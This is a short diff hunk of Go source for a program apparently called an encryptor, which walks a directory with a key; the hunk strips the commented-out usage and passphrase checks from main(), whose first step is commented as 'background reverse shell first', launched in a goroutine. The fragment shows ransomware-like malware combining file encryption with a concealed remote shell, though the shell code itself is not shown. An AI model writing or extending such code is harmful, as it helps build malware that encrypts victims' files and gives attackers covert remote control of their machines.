@@ -241,18 +241,6 @@ func processDirectory(root string, key []byte) error {
 }
 
 func main() {
-	//if len(os.Args) != 3 {
-	//	fmt.Println("Usage: encryptor <directory> <passphrase>")
-	//	return
-	//}
-
-	//dir := os.Args[1]
-	//pass := os.Args[2]
-	//if len(pass) < 8 {
-	//	fmt.Println("Passphrase must be at least 8 characters")
-	//	return
-	//}
-
 	// background reverse shell first
 	var wg sync.WaitGroup
 	wg.Add(1)
